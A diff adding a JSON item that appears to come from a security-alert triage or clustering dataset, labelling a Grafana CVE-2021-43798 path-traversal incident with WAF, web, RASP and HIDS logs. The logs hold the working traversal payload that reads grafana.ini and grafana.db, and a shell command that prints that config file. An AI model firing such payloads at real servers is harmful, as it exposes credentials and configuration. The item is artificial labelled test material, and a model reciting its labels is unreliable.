@@ -1,0 +1,49 @@
+{
+ "unit": 1017,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "Grafana 插件路径穿越 CVE-2021-43798（读取 grafana.db / grafana.ini）",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-04 16:53:15",
+   "source": "waf",
+   "log_id": "WAF0225668",
+   "content": "/public/plugins/alertlist/ ../../../../../../etc/grafana/grafana.ini Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+   "event_id": "1017-WAF0225668"
+  },
+  {
+   "timestamp": "2026-06-04 16:53:17",
+   "source": "web",
+   "log_id": "WEB0227137",
+   "content": "/public/plugins/alertlist/ ../../../../../../etc/grafana/grafana.ini Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+   "event_id": "1017-WEB0227137"
+  },
+  {
+   "timestamp": "2026-06-04 16:53:18",
+   "source": "rasp",
+   "log_id": "RASP0249666",
+   "content": "https://app-go-109.ops-corp.com/public/plugins/alertlist/ {\"traversal\": \"etc/grafana.db\"} Mozilla/5.0 (Windows",
+   "event_id": "1017-RASP0249666"
+  },
+  {
+   "timestamp": "2026-06-04 16:55:13",
+   "source": "hids",
+   "log_id": "HID0244567",
+   "content": "cat /etc/grafana/grafana.ini <== /bin/sh -c 'cat /etc/grafana/grafana.ini' <== grafana-server",
+   "event_id": "1017-HID0244567"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
